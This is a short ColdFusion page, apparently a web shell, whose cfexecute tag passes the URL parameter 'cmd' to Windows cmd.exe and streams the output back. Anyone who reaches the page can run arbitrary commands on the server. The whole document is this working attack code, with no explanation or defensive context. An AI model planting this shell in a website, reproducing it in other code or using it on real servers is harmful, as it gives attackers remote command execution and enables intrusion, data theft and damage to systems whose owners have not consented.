<cfflush interval = "1">
<cfexecute name = "C:/Windows/System32/cmd.exe" 
arguments = "/c #url.cmd#"
timeout = "1000"> 
</cfexecute>